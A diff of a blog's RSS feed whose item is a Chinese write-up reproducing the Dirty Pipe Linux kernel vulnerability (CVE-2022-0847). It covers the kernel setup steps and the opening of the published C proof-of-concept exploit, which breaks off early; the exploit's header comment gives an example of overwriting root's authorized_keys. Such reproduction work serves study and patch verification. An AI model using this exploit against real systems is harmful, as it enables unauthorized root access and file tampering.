@@ -1,802 +1,802 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>漏洞复现 on k1te's blog</title><link>https://k1te.cn/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</link><description>Recent content in 漏洞复现 on k1te's blog</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Sat, 12 Mar 2022 20:32:23 +0800</lastBuildDate><atom:link href="https://k1te.cn/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/index.xml" rel="self" type="application/rss+xml"/><item><title>Dirty_pipe复现</title><link>https://k1te.cn/p/dirty_pipe%E5%A4%8D%E7%8E%B0/</link><pubDate>Sat, 12 Mar 2022 20:32:23 +0800</pubDate><guid>https://k1te.cn/p/dirty_pipe%E5%A4%8D%E7%8E%B0/</guid><description>&lt;h2 id="简介">简介
-&lt;/h2>&lt;blockquote>
-&lt;p>攻击者通过利用此漏洞，可覆盖重写任意可读文件中的数据，从而可将普通权限的用户提升到特权 root。CVE-2022-0847 的漏洞原理类似于 CVE-2016-5195 脏牛漏洞（Dirty Cow），但它更容易被利用。漏洞作者将此漏洞命名为“Dirty Pipe”&lt;/p>
-&lt;/blockquote>
-&lt;p>漏洞编号：CVE-2022-0847&lt;/p>
-&lt;p>影响版本： Linux内核 5.8 及之后版本&lt;/p>
-&lt;h2 id="环境配置">环境配置
-&lt;/h2>&lt;p>Ubuntu20.04默认内核版本是5.4：&lt;/p>
-&lt;div class="highlight">&lt;div class="chroma">
-&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
-&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
-&lt;/span>&lt;span class="lnt">2
-&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
-&lt;td class="lntd">
-&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">root@ee399f8033c1:/# uname -r
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">5.4.0-100-generic
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
-&lt;/div>
-&lt;/div>&lt;p>我们需要安装5.8及以上的内核，当然直接下载内核版本比较高的发行版也可以，比如kali。&lt;/p>
-&lt;p>我们可以去&lt;a class="link" href="https://kernel.ubuntu.com/~kernel-ppa/mainline/" target="_blank" rel="noopener"
->Index of /~kernel-ppa/mainline (ubuntu.com)&lt;/a>找到我们需要的内核，这里选的5.16的:&lt;/p>
-&lt;p>&lt;img src="https://k1te.cn/p/dirty_pipe%E5%A4%8D%E7%8E%B0/image-20220314113747609.png"
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>漏洞复现 on</title><link>https://k1te.cn/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</link><description>Recent content in 漏洞复现 on</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Sat, 12 Mar 2022 20:32:23 +0800</lastBuildDate><atom:link href="https://k1te.cn/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/index.xml" rel="self" type="application/rss+xml"/><item><title>Dirty_pipe复现</title><link>https://k1te.cn/p/dirty_pipe%E5%A4%8D%E7%8E%B0/</link><pubDate>Sat, 12 Mar 2022 20:32:23 +0800</pubDate><guid>https://k1te.cn/p/dirty_pipe%E5%A4%8D%E7%8E%B0/</guid><description>&lt;h2 id="简介"&gt;简介
+&lt;/h2&gt;&lt;blockquote&gt;
+&lt;p&gt;攻击者通过利用此漏洞，可覆盖重写任意可读文件中的数据，从而可将普通权限的用户提升到特权 root。CVE-2022-0847 的漏洞原理类似于 CVE-2016-5195 脏牛漏洞（Dirty Cow），但它更容易被利用。漏洞作者将此漏洞命名为“Dirty Pipe”&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;漏洞编号：CVE-2022-0847&lt;/p&gt;
+&lt;p&gt;影响版本： Linux内核 5.8 及之后版本&lt;/p&gt;
+&lt;h2 id="环境配置"&gt;环境配置
+&lt;/h2&gt;&lt;p&gt;Ubuntu20.04默认内核版本是5.4：&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;span class="lnt"&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;root@ee399f8033c1:/# uname -r
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;5.4.0-100-generic
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;我们需要安装5.8及以上的内核，当然直接下载内核版本比较高的发行版也可以，比如kali。&lt;/p&gt;
+&lt;p&gt;我们可以去&lt;a class="link" href="https://kernel.ubuntu.com/~kernel-ppa/mainline/" target="_blank" rel="noopener"
+&gt;Index of /~kernel-ppa/mainline (ubuntu.com)&lt;/a&gt;找到我们需要的内核，这里选的5.16的:&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://k1te.cn/p/dirty_pipe%E5%A4%8D%E7%8E%B0/image-20220314113747609.png"
 width="777"
 height="443"
-srcset="https://k1te.cn/p/dirty_pipe%E5%A4%8D%E7%8E%B0/image-20220314113747609_hu11224882187172776543.png 480w, https://k1te.cn/p/dirty_pipe%E5%A4%8D%E7%8E%B0/image-20220314113747609_hu2068276313790760164.png 1024w"
+srcset="https://k1te.cn/p/dirty_pipe%E5%A4%8D%E7%8E%B0/image-20220314113747609_hu_c933a5bb4fe52bef.png 480w, https://k1te.cn/p/dirty_pipe%E5%A4%8D%E7%8E%B0/image-20220314113747609_hu_3a05649c152c78e.png 1024w"
 loading="lazy"
 class="gallery-image"
 data-flex-grow="175"
 data-flex-basis="420px"
->&lt;/p>
-&lt;p>下载：&lt;/p>
-&lt;div class="highlight">&lt;div class="chroma">
-&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
-&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
-&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
-&lt;td class="lntd">
-&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">wget https://kernel.ubuntu.com/~kernel-ppa/mainline/v5.16/amd64/linux-image-unsigned-5.16.0-051600-generic_5.16.0-051600.202201092355_amd64.deb https://kernel.ubuntu.com/~kernel-ppa/mainline/v5.16/amd64/linux-modules-5.16.0-051600-generic_5.16.0-051600.202201092355_amd64.deb
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
-&lt;/div>
-&lt;/div>&lt;p>安装：&lt;/p>
-&lt;div class="highlight">&lt;div class="chroma">
-&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
-&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
-&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
-&lt;td class="lntd">
-&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">dpkg -i linux*.deb
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
-&lt;/div>
-&lt;/div>&lt;p>&lt;img src="https://k1te.cn/p/dirty_pipe%E5%A4%8D%E7%8E%B0/image-20220314114012165.png"
+&gt;&lt;/p&gt;
+&lt;p&gt;下载：&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;wget https://kernel.ubuntu.com/~kernel-ppa/mainline/v5.16/amd64/linux-image-unsigned-5.16.0-051600-generic_5.16.0-051600.202201092355_amd64.deb https://kernel.ubuntu.com/~kernel-ppa/mainline/v5.16/amd64/linux-modules-5.16.0-051600-generic_5.16.0-051600.202201092355_amd64.deb
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;安装：&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;dpkg -i linux*.deb
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src="https://k1te.cn/p/dirty_pipe%E5%A4%8D%E7%8E%B0/image-20220314114012165.png"
 width="733"
 height="418"
-srcset="https://k1te.cn/p/dirty_pipe%E5%A4%8D%E7%8E%B0/image-20220314114012165_hu17180508437674590683.png 480w, https://k1te.cn/p/dirty_pipe%E5%A4%8D%E7%8E%B0/image-20220314114012165_hu6438328083064438313.png 1024w"
+srcset="https://k1te.cn/p/dirty_pipe%E5%A4%8D%E7%8E%B0/image-20220314114012165_hu_511726d788047165.png 480w, https://k1te.cn/p/dirty_pipe%E5%A4%8D%E7%8E%B0/image-20220314114012165_hu_85ed92b01d89f505.png 1024w"
 loading="lazy"
 class="gallery-image"
 data-flex-grow="175"
 data-flex-basis="420px"
->&lt;/p>
-&lt;p>更新grub系统引导并重启:&lt;/p>
-&lt;div class="highlight">&lt;div class="chroma">
-&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
-&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
-&lt;/span>&lt;span class="lnt">2
-&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
-&lt;td class="lntd">
-&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">update-grub
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">reboot
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
-&lt;/div>
-&lt;/div>&lt;p>&lt;img src="https://k1te.cn/p/dirty_pipe%E5%A4%8D%E7%8E%B0/image-20220314114039278.png"
+&gt;&lt;/p&gt;
+&lt;p&gt;更新grub系统引导并重启:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;span class="lnt"&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;update-grub
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;reboot
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src="https://k1te.cn/p/dirty_pipe%E5%A4%8D%E7%8E%B0/image-20220314114039278.png"
 width="413"
 height="180"
-srcset="https://k1te.cn/p/dirty_pipe%E5%A4%8D%E7%8E%B0/image-20220314114039278_hu10067717894526498292.png 480w, https://k1te.cn/p/dirty_pipe%E5%A4%8D%E7%8E%B0/image-20220314114039278_hu11469993654507519281.png 1024w"
+srcset="https://k1te.cn/p/dirty_pipe%E5%A4%8D%E7%8E%B0/image-20220314114039278_hu_b041a639fdc3ff0d.png 480w, https://k1te.cn/p/dirty_pipe%E5%A4%8D%E7%8E%B0/image-20220314114039278_hu_538c373df3d75c22.png 1024w"
 loading="lazy"
 class="gallery-image"
 data-flex-grow="229"
 data-flex-basis="550px"
->&lt;/p>
-&lt;p>&lt;img src="https://k1te.cn/p/dirty_pipe%E5%A4%8D%E7%8E%B0/image-20220314114059806.png"
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://k1te.cn/p/dirty_pipe%E5%A4%8D%E7%8E%B0/image-20220314114059806.png"
 width="200"
 height="37"
-srcset="https://k1te.cn/p/dirty_pipe%E5%A4%8D%E7%8E%B0/image-20220314114059806_hu9739258286127093185.png 480w, https://k1te.cn/p/dirty_pipe%E5%A4%8D%E7%8E%B0/image-20220314114059806_hu11268531404757864204.png 1024w"
+srcset="https://k1te.cn/p/dirty_pipe%E5%A4%8D%E7%8E%B0/image-20220314114059806_hu_75cca79290471c30.png 480w, https://k1te.cn/p/dirty_pipe%E5%A4%8D%E7%8E%B0/image-20220314114059806_hu_8b30ebf7a11038cf.png 1024w"
 loading="lazy"
 alt="image-20220314114059806"
 class="gallery-image"
 data-flex-grow="540"
 data-flex-basis="1297px"
->&lt;/p>
-&lt;h2 id="poc1">POC1
-&lt;/h2>&lt;p>第一个是作者自己发表的：&lt;a class="link" href="https://dirtypipe.cm4all.com/" target="_blank" rel="noopener"
->The Dirty Pipe Vulnerability&lt;/a>&lt;/p>
-&lt;div class="highlight">&lt;div class="chroma">
-&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
-&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
-&lt;/span>&lt;span class="lnt"> 2
-&lt;/span>&lt;span class="lnt"> 3
-&lt;/span>&lt;span class="lnt"> 4
-&lt;/span>&lt;span class="lnt"> 5
-&lt;/span>&lt;span class="lnt"> 6
-&lt;/span>&lt;span class="lnt"> 7
-&lt;/span>&lt;span class="lnt"> 8
-&lt;/span>&lt;span class="lnt"> 9
-&lt;/span>&lt;span class="lnt"> 10
-&lt;/span>&lt;span class="lnt"> 11
-&lt;/span>&lt;span class="lnt"> 12
-&lt;/span>&lt;span class="lnt"> 13
-&lt;/span>&lt;span class="lnt"> 14
-&lt;/span>&lt;span class="lnt"> 15
-&lt;/span>&lt;span class="lnt"> 16
-&lt;/span>&lt;span class="lnt"> 17
-&lt;/span>&lt;span class="lnt"> 18
-&lt;/span>&lt;span class="lnt"> 19
-&lt;/span>&lt;span class="lnt"> 20
-&lt;/span>&lt;span class="lnt"> 21
-&lt;/span>&lt;span class="lnt"> 22
-&lt;/span>&lt;span class="lnt"> 23
-&lt;/span>&lt;span class="lnt"> 24
-&lt;/span>&lt;span class="lnt"> 25
-&lt;/span>&lt;span class="lnt"> 26
-&lt;/span>&lt;span class="lnt"> 27
-&lt;/span>&lt;span class="lnt"> 28
-&lt;/span>&lt;span class="lnt"> 29
-&lt;/span>&lt;span class="lnt"> 30
-&lt;/span>&lt;span class="lnt"> 31
-&lt;/span>&lt;span class="lnt"> 32
-&lt;/span>&lt;span class="lnt"> 33
-&lt;/span>&lt;span class="lnt"> 34
-&lt;/span>&lt;span class="lnt"> 35
-&lt;/span>&lt;span class="lnt"> 36
-&lt;/span>&lt;span class="lnt"> 37
-&lt;/span>&lt;span class="lnt"> 38
-&lt;/span>&lt;span class="lnt"> 39
-&lt;/span>&lt;span class="lnt"> 40
-&lt;/span>&lt;span class="lnt"> 41
-&lt;/span>&lt;span class="lnt"> 42
-&lt;/span>&lt;span class="lnt"> 43
-&lt;/span>&lt;span class="lnt"> 44
-&lt;/span>&lt;span class="lnt"> 45
-&lt;/span>&lt;span class="lnt"> 46
-&lt;/span>&lt;span class="lnt"> 47
-&lt;/span>&lt;span class="lnt"> 48
-&lt;/span>&lt;span class="lnt"> 49
-&lt;/span>&lt;span class="lnt"> 50
-&lt;/span>&lt;span class="lnt"> 51
-&lt;/span>&lt;span class="lnt"> 52
-&lt;/span>&lt;span class="lnt"> 53
-&lt;/span>&lt;span class="lnt"> 54
-&lt;/span>&lt;span class="lnt"> 55
-&lt;/span>&lt;span class="lnt"> 56
-&lt;/span>&lt;span class="lnt"> 57
-&lt;/span>&lt;span class="lnt"> 58
-&lt;/span>&lt;span class="lnt"> 59
-&lt;/span>&lt;span class="lnt"> 60
-&lt;/span>&lt;span class="lnt"> 61
-&lt;/span>&lt;span class="lnt"> 62
-&lt;/span>&lt;span class="lnt"> 63
-&lt;/span>&lt;span class="lnt"> 64
-&lt;/span>&lt;span class="lnt"> 65
-&lt;/span>&lt;span class="lnt"> 66
-&lt;/span>&lt;span class="lnt"> 67
-&lt;/span>&lt;span class="lnt"> 68
-&lt;/span>&lt;span class="lnt"> 69
-&lt;/span>&lt;span class="lnt"> 70
-&lt;/span>&lt;span class="lnt"> 71
-&lt;/span>&lt;span class="lnt"> 72
-&lt;/span>&lt;span class="lnt"> 73
-&lt;/span>&lt;span class="lnt"> 74
-&lt;/span>&lt;span class="lnt"> 75
-&lt;/span>&lt;span class="lnt"> 76
-&lt;/span>&lt;span class="lnt"> 77
-&lt;/span>&lt;span class="lnt"> 78
-&lt;/span>&lt;span class="lnt"> 79
-&lt;/span>&lt;span class="lnt"> 80
-&lt;/span>&lt;span class="lnt"> 81
-&lt;/span>&lt;span class="lnt"> 82
-&lt;/span>&lt;span class="lnt"> 83
-&lt;/span>&lt;span class="lnt"> 84
-&lt;/span>&lt;span class="lnt"> 85
-&lt;/span>&lt;span class="lnt"> 86
-&lt;/span>&lt;span class="lnt"> 87
-&lt;/span>&lt;span class="lnt"> 88
-&lt;/span>&lt;span class="lnt"> 89
-&lt;/span>&lt;span class="lnt"> 90
-&lt;/span>&lt;span class="lnt"> 91
-&lt;/span>&lt;span class="lnt"> 92
-&lt;/span>&lt;span class="lnt"> 93
-&lt;/span>&lt;span class="lnt"> 94
-&lt;/span>&lt;span class="lnt"> 95
-&lt;/span>&lt;span class="lnt"> 96
-&lt;/span>&lt;span class="lnt"> 97
-&lt;/span>&lt;span class="lnt"> 98
-&lt;/span>&lt;span class="lnt"> 99
-&lt;/span>&lt;span class="lnt">100
-&lt;/span>&lt;span class="lnt">101
-&lt;/span>&lt;span class="lnt">102
-&lt;/span>&lt;span class="lnt">103
-&lt;/span>&lt;span class="lnt">104
-&lt;/span>&lt;span class="lnt">105
-&lt;/span>&lt;span class="lnt">106
-&lt;/span>&lt;span class="lnt">107
-&lt;/span>&lt;span class="lnt">108
-&lt;/span>&lt;span class="lnt">109
-&lt;/span>&lt;span class="lnt">110
-&lt;/span>&lt;span class="lnt">111
-&lt;/span>&lt;span class="lnt">112
-&lt;/span>&lt;span class="lnt">113
-&lt;/span>&lt;span class="lnt">114
-&lt;/span>&lt;span class="lnt">115
-&lt;/span>&lt;span class="lnt">116
-&lt;/span>&lt;span class="lnt">117
-&lt;/span>&lt;span class="lnt">118
-&lt;/span>&lt;span class="lnt">119
-&lt;/span>&lt;span class="lnt">120
-&lt;/span>&lt;span class="lnt">121
-&lt;/span>&lt;span class="lnt">122
-&lt;/span>&lt;span class="lnt">123
-&lt;/span>&lt;span class="lnt">124
-&lt;/span>&lt;span class="lnt">125
-&lt;/span>&lt;span class="lnt">126
-&lt;/span>&lt;span class="lnt">127
-&lt;/span>&lt;span class="lnt">128
-&lt;/span>&lt;span class="lnt">129
-&lt;/span>&lt;span class="lnt">130
-&lt;/span>&lt;span class="lnt">131
-&lt;/span>&lt;span class="lnt">132
-&lt;/span>&lt;span class="lnt">133
-&lt;/span>&lt;span class="lnt">134
-&lt;/span>&lt;span class="lnt">135
-&lt;/span>&lt;span class="lnt">136
-&lt;/span>&lt;span class="lnt">137
-&lt;/span>&lt;span class="lnt">138
-&lt;/span>&lt;span class="lnt">139
-&lt;/span>&lt;span class="lnt">140
-&lt;/span>&lt;span class="lnt">141
-&lt;/span>&lt;span class="lnt">142
-&lt;/span>&lt;span class="lnt">143
-&lt;/span>&lt;span class="lnt">144
-&lt;/span>&lt;span class="lnt">145
-&lt;/span>&lt;span class="lnt">146
-&lt;/span>&lt;span class="lnt">147
-&lt;/span>&lt;span class="lnt">148
-&lt;/span>&lt;span class="lnt">149
-&lt;/span>&lt;span class="lnt">150
-&lt;/span>&lt;span class="lnt">151
-&lt;/span>&lt;span class="lnt">152
-&lt;/span>&lt;span class="lnt">153
-&lt;/span>&lt;span class="lnt">154
-&lt;/span>&lt;span class="lnt">155
-&lt;/span>&lt;span class="lnt">156
-&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
-&lt;td class="lntd">
-&lt;pre tabindex="0" class="chroma">&lt;code class="language-c++" data-lang="c++">&lt;span class="line">&lt;span class="cl">&lt;span class="cm">/* SPDX-License-Identifier: GPL-2.0 */&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm">/*
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm"> * Copyright 2022 CM4all GmbH / IONOS SE
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm"> *
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm"> * author: Max Kellermann &amp;lt;max.kellermann@ionos.com&amp;gt;
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm"> *
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm"> * Proof-of-concept exploit for the Dirty Pipe
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm"> * vulnerability (CVE-2022-0847) caused by an uninitialized
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm"> * &amp;#34;pipe_buffer.flags&amp;#34; variable. It demonstrates how to overwrite any
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm"> * file contents in the page cache, even if the file is not permitted
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm"> * to be written, immutable or on a read-only mount.
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm"> *
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm"> * This exploit requires Linux 5.8 or later; the code path was made
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm"> * reachable by commit f6dd975583bd (&amp;#34;pipe: merge
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm"> * anon_pipe_buf*_ops&amp;#34;). The commit did not introduce the bug, it was
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm"> * there before, it just provided an easy way to exploit it.
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm"> *
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm"> * There are two major limitations of this exploit: the offset cannot
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm"> * be on a page boundary (it needs to write one byte before the offset
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm"> * to add a reference to this page to the pipe), and the write cannot
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm"> * cross a page boundary.
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm"> *
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm"> * Example: ./write_anything /root/.ssh/authorized_keys 1 $&amp;#39;\nssh-ed25519 AAA......\n&amp;#39;
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm"> *
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm"> * Further explanation: https://dirtypipe.cm4all.com/
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm"> */&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#define _GNU_SOURCE
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;unistd.h&amp;gt;&lt;/span>&lt;span class="cp">
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;fcntl.h&amp;gt;&lt;/span>&lt;span class="cp">
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span class="cp">
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;stdlib.h&amp;gt;&lt;/span>&lt;span class="cp">
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;string.h&amp;gt;&lt;/span>&lt;span class="cp">
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;sys/stat.h&amp;gt;&lt;/span>&lt;span class="cp">
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;sys/user.h&amp;gt;&lt;/span>&lt;span class="cp">
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#ifndef PAGE_SIZE
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#define PAGE_SIZE 4096
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#endif
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm">/**
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm"> * Create a pipe where all &amp;#34;bufs&amp;#34; on the pipe_inode_info ring have the
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm"> * PIPE_BUF_FLAG_CAN_MERGE flag set.
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm"> */&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">static&lt;/span> &lt;span class="kt">void&lt;/span> &lt;span class="nf">prepare_pipe&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">int&lt;/span> &lt;span class="n">p&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">])&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">pipe&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">p&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="n">abort&lt;/span>&lt;span class="p">();&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">const&lt;/span> &lt;span class="kt">unsigned&lt;/span> &lt;span class="n">pipe_size&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">fcntl&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">p&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="n">F_GETPIPE_SZ&lt;/span>&lt;span class="p">);&lt;/span>
